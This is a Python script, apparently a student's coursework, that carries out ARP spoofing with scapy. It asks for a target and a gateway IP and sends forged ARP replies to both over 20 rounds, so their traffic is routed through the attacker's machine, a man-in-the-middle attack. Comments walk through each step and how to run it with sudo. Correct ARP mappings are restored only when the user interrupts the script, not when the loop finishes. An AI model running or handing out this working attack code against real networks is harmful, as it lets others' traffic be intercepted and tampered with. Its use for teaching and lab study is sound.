"""Mounif El Khatib
    202472448"""
from main_config import validate_ip
from scapy.all import ARP, Ether, srp, send
import time
import sys
import os
# To get gatewaye in command promote write --> route -n

# To run in ubuntu
# sudo python3 path_to_file/arp_spoofing.py
# ask user to enter target ip and the gateway
target_ip = validate_ip("Enter target IP: ")
gateway_ip = validate_ip("Enter gateway IP: ")


# This function get Mac address for the target machine of a unique ip
def mac_target(ip):
    # create ARP packet with op=1 to see who has this ip to get its mac
    create_arp_packet = ARP(pdst=ip, op=1)
    # then prepare a broadcast packet
    send_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
    # create a full request arp packet by combine the created layer
    full_request_packet = send_broadcast / create_arp_packet
    # To send the message and waite for a responce 
    get_responce = srp(full_request_packet, verbose= False)
    # return the mac address of detsination that has the target ip
    return get_responce[0][0][1].hwsrc

# This function send a spoof arp replies , and control target arp table as it refresh 
def spoof_mac(target_ip,spoof_ip):
    get_target_mac = mac_target(target_ip)
    # this is a reply packet by lable op=2 
    # target_ip is for the spoof device
    # target_mac is for the spoof device
    # spoof_ip pretend to be this ip
    create_arp_packet =ARP(op =2, pdst = target_ip, hwdst= get_target_mac, psrc = spoof_ip)
    # send spoof arp reply silently 
    send(create_arp_packet,verbose=False)



def correct_arp_mapping(destination_ip, source_ip):
    # get mac address for the destination
    destination_mac = mac_target(destination_ip)
    # get mac address for the source
    source_mac = mac_target(source_ip)
    # prepare a arp reply that contain correct mapping source/destination
    # this correct arp table of target
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )  
    # then send a 5 packet to make sure that a packet is recived if a loss take place
    send(packet, count=5, verbose=False) 


sent_packets = 0
try:
        for i in range(1,21):
        # while True:

            # in this code we are going to spoof both the gateway and the target ip
            # this send a spoof arp to target device telling him that the gateway mac is asscioated with attacker mac
            # then the target will send its traffic to the attacker instead of gateway
            spoof_mac(target_ip, gateway_ip)
            # this send a spoof arp to the gatway telling him that the attacker mac is the victim
            spoof_mac(gateway_ip, target_ip)
            # each time two packets is send 
            sent_packets += 2

            #sys.stdout.write("\rSent packets: " + str(sent_packets)),
            time.sleep(2)

except KeyboardInterrupt:
        # if an error occurse correct arp table
        correct_arp_mapping(target_ip, gateway_ip)
        correct_arp_mapping(gateway_ip, target_ip)
